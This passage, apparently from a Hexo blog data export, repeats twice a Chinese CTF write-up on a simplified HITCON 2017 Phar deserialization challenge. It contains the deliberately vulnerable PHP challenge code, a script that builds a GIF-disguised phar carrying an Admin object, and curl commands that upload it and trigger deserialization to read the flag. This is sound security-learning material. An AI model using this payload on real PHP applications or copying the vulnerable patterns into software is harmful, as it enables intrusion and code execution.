class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Admin</span> <span class=\"keyword\">extends</span> <span class=\"title\">User</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">       $_GET[<span class=\"string\">\"lucky\"</span>]();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">randomkeys</span><span class=\"params\">($length)</span></span>&#123;   </span><br><span class=\"line\">   $output=<span class=\"string\">''</span>;   </span><br><span class=\"line\">   <span class=\"keyword\">for</span> ($a = <span class=\"number\">0</span>; $a&lt;$length; $a++) &#123;   </span><br><span class=\"line\">       $output .= chr(mt_rand(<span class=\"number\">0</span>, <span class=\"number\">0xFF</span>));    <span class=\"comment\">//生成php随机数   </span></span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    <span class=\"keyword\">return</span> $output;   </span><br><span class=\"line\">&#125;   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFlag</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">   $flag = file_get_contents(<span class=\"string\">\"/flag\"</span>);</span><br><span class=\"line\">   <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_session</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">global</span> $SECRET;</span><br><span class=\"line\">   $data = $_COOKIE[<span class=\"string\">\"session-data\"</span>];</span><br><span class=\"line\">   <span class=\"keyword\">list</span>($data, $hmac) = explode(<span class=\"string\">\"-----\"</span>, $data, <span class=\"number\">2</span>);</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">\"Bye\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!hash_equals(hash_hmac(<span class=\"string\">\"sha1\"</span>, $data, $SECRET), $hmac)) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">\"Bye Bye\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">   $data = unserialize($data);    <span class=\"comment\">//判断身份，如果身份正确返回头像路径(沙盒路径)</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data-&gt;avatar)) &#123;    <span class=\"comment\">//该函数不可绕过</span></span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">\"Bye Bye Bye\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> $data-&gt;avatar;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload</span><span class=\"params\">($path)</span> </span>&#123;    <span class=\"comment\">//获取头像，检查头是否为GIF89a ，正确后存入沙盒</span></span><br><span class=\"line\">   $data = file_get_contents($_GET[<span class=\"string\">\"url\"</span>] . <span class=\"string\">\"/avatar.gif\"</span>);</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (substr($data, <span class=\"number\">0</span>, <span class=\"number\">6</span>) !== <span class=\"string\">\"GIF89a\"</span>) &#123;    <span class=\"comment\">//这个就是利用 phar:// 进行反序列化的点</span></span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">\"Fuck off\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">   file_put_contents($path . <span class=\"string\">\"/avatar.gif\"</span>, $data);</span><br><span class=\"line\">   <span class=\"keyword\">die</span>(<span class=\"string\">\"Upload OK\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span><span class=\"params\">($path)</span> </span>&#123;    <span class=\"comment\">//获取这个沙盒中的头像</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!file_exists($path . <span class=\"string\">\"/avatar.gif\"</span>)) &#123;</span><br><span class=\"line\">       $path = <span class=\"string\">\"/var/www/html\"</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">   header(<span class=\"string\">\"Content-Type: image/gif\"</span>);</span><br><span class=\"line\">   <span class=\"keyword\">die</span>(file_get_contents($path . <span class=\"string\">\"/avatar.gif\"</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$mode = $_GET[<span class=\"string\">\"m\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($mode == <span class=\"string\">\"upload\"</span>) &#123;</span><br><span class=\"line\">   upload(check_session());</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ($mode == <span class=\"string\">\"show\"</span>) &#123;</span><br><span class=\"line\">   show(check_session());</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">   highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"简述\"><a href=\"#简述\" class=\"headerlink\" title=\"简述\"></a>简述</h2><p>这道题是根据经典题目进行的改编，进行了简化，关键位置已经加上了注释。原题目为Orange 在 2017 年 hitcon 上面出的利用 Phar 进行反序列化。<br>题目很简短，接下来就让我们一起分析一下这道题。<br>题目简析</p>\n<p>这是一个反序列化的题目。但是当年这道题全球0解，原因是用户认证部分不可以绕过，如果我们想要利用unserailize()，通过控制参数去实现反序列化，必须先绕过cookie检验。<br>但是cookie是通过remote_addr配合sha1进行hmac签名生成的，几乎不可能绕过，当时做题的人统统沉迷于此，才最终全球0解。<br>另辟蹊径</p>\n<h2 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h2><p>我们使用 Phar 反序列化的条件有三点<br>(1)文件上传点<br>(2)系统文件函数<br>(3) phar:// 伪协议</p>\n<p>可以看到 upload 函数，完美契合我们的要求，我们此时只要精心构造一个包含Admin对象和avatar.gif文件，并且起始为 GIF89a 的phar文件传上去，下一次通过Phar://协议让file_get_contents 请求这个文件就可以实现我们对 Admin 对象的反序列化了！</p>\n<p>程序示例：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Admin</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> $avatar = <span class=\"string\">'orz'</span>;  </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">$p = <span class=\"keyword\">new</span> Phar(<span class=\"keyword\">__DIR__</span> . <span class=\"string\">'/avatar.phar'</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">$p[<span class=\"string\">'file.php'</span>] = <span class=\"string\">'&lt;?php ?&gt;'</span>;</span><br><span class=\"line\">$p-&gt;setMetadata(<span class=\"keyword\">new</span> Admin());</span><br><span class=\"line\">$p-&gt;setStub(<span class=\"string\">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class=\"line\">rename(<span class=\"keyword\">__DIR__</span> . <span class=\"string\">'/avatar.phar'</span>, <span class=\"keyword\">__DIR__</span> . <span class=\"string\">'/avatar.gif'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>解题过程</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://hostname --cookie-jar cookie</span><br><span class=\"line\">返回 ： ... 无关紧要</span><br><span class=\"line\">curl -b cookie 'http://hostname?m=upload&amp;url=http://你的服务器host'</span><br><span class=\"line\">返回：Upload OK%</span><br><span class=\"line\">curl -b cookie 'http://hostname?m=upload&amp;url=phar:///var/www/data/（ctf + 本地IP）base64编码&amp;lucky=getFlag</span><br></pre></td></tr></table></figure>\n\n<p>返回：flag<br>即可解出～！！(*･ω･)</p>\n<h2 id=\"题目回顾\"><a href=\"#题目回顾\" class=\"headerlink\" title=\"题目回顾\"></a>题目回顾</h2><p>在2020年做这种题目网上题解一艘一堆，直接初步定位题目类型简简单单，但是具体一些细节也会让你很难直接做对<br>首先这道题是base64不是md5，有的人看完原题直接就用md5，老老实实看题还是有必要的<br>此外这道题没有用到匿名函数，省去了写脚本的步骤，降低了难度<br>太久没看php最近都在看Go，看见’ctf’ . ‘ip’ 以为是一个类或者结构体的属性….(是拼接啊喂！基础啊老哥！！！)<br>最后（ctf + 本地IP）base64 直接在浏览器，Brupsuite，POSTMAN都可以很明确的获取到，这里也是本人实力眼瞎没有看到…其实！！！题目里明明写了是ctf和IP拼接！！！啊啊啊！！这个错误耗时3小时，最后还是交流了一下才发现没加….一个刻骨铭心的错误Otz<br>这道题每个用户可以彼此空间隔离，不会出现一个上传，全体白嫖的现象，妙啊</p>\n<h2 id=\"尾言\"><a href=\"#尾言\" class=\"headerlink\" title=\"尾言\"></a>尾言</h2><p>遇到自己一小时解决不了的问题还是交流一下比较好，没有交流很容易自闭hhh<br>最后BiliBili贴代码怎么自动高光，需要后续研究一下=。=手动变色太麻烦了<br>有哪里想交流随时留言！！感觉安全方面学习交流还是比没有代码那么方便，欢迎交流啊～</p>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><p>如果想要深入学习反序列化，为各位推荐一个大大大佬的博文<br><a href=\"https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面\" target=\"_blank\" rel=\"noopener\">https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>( ｡ớ ₃ờ)ھ经典反序列化问题,今天遇到了一个反序列化问题，最后一步连续踩坑…着实很难受(自己太菜了)！<br>话不多说我们先来看一看题目：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!file_exists(<span class=\"string\">\"/var/www/data/secret\"</span>)) &#123;</span><br><span class=\"line\">   $SECRET = randomkeys(<span class=\"number\">16</span>);</span><br><span class=\"line\">   file_put_contents(<span class=\"string\">\"/var/www/data/secret\"</span>, $SECRET);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">   $SECRET = file_get_contents(<span class=\"string\">\"/var/www/data/secret\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">\"HTTP_X_REAL_IP\"</span>])) $SERVER_IP = $_SERVER[<span class=\"string\">\"HTTP_X_REAL_IP\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">else</span> $SERVER_IP = $_SERVER[<span class=\"string\">\"REMOTE_ADDR\"</span>];</span><br><span class=\"line\">$SANDBOX = <span class=\"string\">\"/var/www/data/\"</span> . base64_encode(<span class=\"string\">\"ctf\"</span> . $SERVER_IP);    <span class=\"comment\">// 根据 remote_addr 给每个人创建一个沙盒</span></span><br><span class=\"line\">@mkdir($SANDBOX);</span><br><span class=\"line\">@chdir($SANDBOX);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">\"session-data\"</span>])) &#123;</span><br><span class=\"line\">   $data = serialize(<span class=\"keyword\">new</span> User($SANDBOX));</span><br><span class=\"line\">   $hmac = hash_hmac(<span class=\"string\">\"sha1\"</span>, $data, $SECRET);    <span class=\"comment\">//将每个人唯一的沙盒对象加上签名后作为 session-data</span></span><br><span class=\"line\">   setcookie(<span class=\"string\">\"session-data\"</span>, sprintf(<span class=\"string\">\"%s-----%s\"</span>, $data, $hmac));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> $avatar;</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($path)</span> </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">$this</span>-&gt;avatar = $path;    <span class=\"comment\">//设置了头像的路径为沙盒路径</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Admin</span> <span class=\"keyword\">extends</span> <span class=\"title\">User</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">       $_GET[<span class=\"string\">\"lucky\"</span>]();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">randomkeys</span><span class=\"params\">($length)</span></span>&#123;   </span><br><span class=\"line\">   $output=<span class=\"string\">''</span>;   </span><br><span class=\"line\">   <span class=\"keyword\">for</span> ($a = <span class=\"number\">0</span>; $a&lt;$length; $a++) &#123;   </span><br><span class=\"line\">       $output .= chr(mt_rand(<span class=\"number\">0</span>, <span class=\"number\">0xFF</span>));    <span class=\"comment\">//生成php随机数   </span></span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    <span class=\"keyword\">return</span> $output;   </span><br><span class=\"line\">&#125;   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFlag</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">   $flag = file_get_contents(<span class=\"string\">\"/flag\"</span>);</span><br><span class=\"line\">   <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_session</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">global</span> $SECRET;</span><br><span class=\"line\">   $data = $_COOKIE[<span class=\"string\">\"session-data\"</span>];</span><br><span class=\"line\">   <span class=\"keyword\">list</span>($data, $hmac) = explode(<span class=\"string\">\"-----\"</span>, $data, <span class=\"number\">2</span>);</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">\"Bye\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!hash_equals(hash_hmac(<span class=\"string\">\"sha1\"</span>, $data, $SECRET), $hmac)) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">\"Bye Bye\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">   $data = unserialize($data);    <span class=\"comment\">//判断身份，如果身份正确返回头像路径(沙盒路径)</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data-&gt;avatar)) &#123;    <span class=\"comment\">//该函数不可绕过</span></span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">\"Bye Bye Bye\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> $data-&gt;avatar;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload</span><span class=\"params\">($path)</span> </span>&#123;    <span class=\"comment\">//获取头像，检查头是否为GIF89a ，正确后存入沙盒</span></span><br><span class=\"line\">   $data = file_get_contents($_GET[<span class=\"string\">\"url\"</span>] . <span class=\"string\">\"/avatar.gif\"</span>);</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (substr($data, <span class=\"number\">0</span>, <span class=\"number\">6</span>) !== <span class=\"string\">\"GIF89a\"</span>) &#123;    <span class=\"comment\">//这个就是利用 phar:// 进行反序列化的点</span></span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">\"Fuck off\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">   file_put_contents($path . <span class=\"string\">\"/avatar.gif\"</span>, $data);</span><br><span class=\"line\">   <span class=\"keyword\">die</span>(<span class=\"string\">\"Upload OK\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span><span class=\"params\">($path)</span> </span>&#123;    <span class=\"comment\">//获取这个沙盒中的头像</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!file_exists($path . <span class=\"string\">\"/avatar.gif\"</span>)) &#123;</span><br><span class=\"line\">       $path = <span class=\"string\">\"/var/www/html\"</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">   header(<span class=\"string\">\"Content-Type: image/gif\"</span>);</span><br><span class=\"line\">   <span class=\"keyword\">die</span>(file_get_contents($path . <span class=\"string\">\"/avatar.gif\"</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$mode = $_GET[<span class=\"string\">\"m\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($mode == <span class=\"string\">\"upload\"</span>) &#123;</span><br><span class=\"line\">   upload(check_session());</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ($mode == <span class=\"string\">\"show\"</span>) &#123;</span><br><span class=\"line\">   show(check_session());</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">   highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"简述\"><a href=\"#简述\" class=\"headerlink\" title=\"简述\"></a>简述</h2><p>这道题是根据经典题目进行的改编，进行了简化，关键位置已经加上了注释。原题目为Orange 在 2017 年 hitcon 上面出的利用 Phar 进行反序列化。<br>题目很简短，接下来就让我们一起分析一下这道题。<br>题目简析</p>\n<p>这是一个反序列化的题目。但是当年这道题全球0解，原因是用户认证部分不可以绕过，如果我们想要利用unserailize()，通过控制参数去实现反序列化，必须先绕过cookie检验。<br>但是cookie是通过remote_addr配合sha1进行hmac签名生成的，几乎不可能绕过，当时做题的人统统沉迷于此，才最终全球0解。<br>另辟蹊径</p>\n<h2 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h2><p>我们使用 Phar 反序列化的条件有三点<br>(1)文件上传点<br>(2)系统文件函数<br>(3) phar:// 伪协议</p>\n<p>可以看到 upload 函数，完美契合我们的要求，我们此时只要精心构造一个包含Admin对象和avatar.gif文件，并且起始为 GIF89a 的phar文件传上去，下一次通过Phar://协议让file_get_contents 请求这个文件就可以实现我们对 Admin 对象的反序列化了！</p>\n<p>程序示例：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Admin</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> $avatar = <span class=\"string\">'orz'</span>;  </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">$p = <span class=\"keyword\">new</span> Phar(<span class=\"keyword\">__DIR__</span> . <span class=\"string\">'/avatar.phar'</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">$p[<span class=\"string\">'file.php'</span>] = <span class=\"string\">'&lt;?php ?&gt;'</span>;</span><br><span class=\"line\">$p-&gt;setMetadata(<span class=\"keyword\">new</span> Admin());</span><br><span class=\"line\">$p-&gt;setStub(<span class=\"string\">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class=\"line\">rename(<span class=\"keyword\">__DIR__</span> . <span class=\"string\">'/avatar.phar'</span>, <span class=\"keyword\">__DIR__</span> . <span class=\"string\">'/avatar.gif'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>解题过程</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://hostname --cookie-jar cookie</span><br><span class=\"line\">返回 ： ... 无关紧要</span><br><span class=\"line\">curl -b cookie 'http://hostname?m=upload&amp;url=http://你的服务器host'</span><br><span class=\"line\">返回：Upload OK%</span><br><span class=\"line\">curl -b cookie 'http://hostname?m=upload&amp;url=phar:///var/www/data/（ctf + 本地IP）base64编码&amp;lucky=getFlag</span><br></pre></td></tr></table></figure>\n\n<p>返回：flag<br>即可解出～！！(*･ω･)</p>\n<h2 id=\"题目回顾\"><a href=\"#题目回顾\" class=\"headerlink\" title=\"题目回顾\"></a>题目回顾</h2><p>在2020年做这种题目网上题解一艘一堆，直接初步定位题目类型简简单单，但是具体一些细节也会让你很难直接做对<br>首先这道题是base64不是md5，有的人看完原题直接就用md5，老老实实看题还是有必要的<br>此外这道题没有用到匿名函数，省去了写脚本的步骤，降低了难度<br>太久没看php最近都在看Go，看见’ctf’ . ‘ip’ 以为是一个类或者结构体的属性….(是拼接啊喂！基础啊老哥！！！)<br>最后（ctf + 本地IP）base64 直接在浏览器，Brupsuite，POSTMAN都可以很明确的获取到，这里也是本人实力眼瞎没有看到…其实！！！题目里明明写了是ctf和IP拼接！！！啊啊啊！！这个错误耗时3小时，最后还是交流了一下才发现没加….一个刻骨铭心的错误Otz<br>这道题每个用户可以彼此空间隔离，不会出现一个上传，全体白嫖的现象，妙啊</p>\n<h2 id=\"尾言\"><a href=\"#尾言\" class=\"headerlink\" title=\"尾言\"></a>尾言</h2><p>遇到自己一小时解决不了的问题还是交流一下比较好，没有交流很容易自闭hhh<br>最后BiliBili贴代码怎么自动高光，需要后续研究一下=。=手动变色太麻烦了<br>有哪里想交流随时留言！！感觉安全方面学习交流还是比没有代码那么方便，欢迎交流啊～</p>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><p>如果想要深入学习反序列化，为各位推荐一个大大大佬的博文<br><a href=\"https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面\" target=\"_blank\" rel=\"noopener\">https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面</a></p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}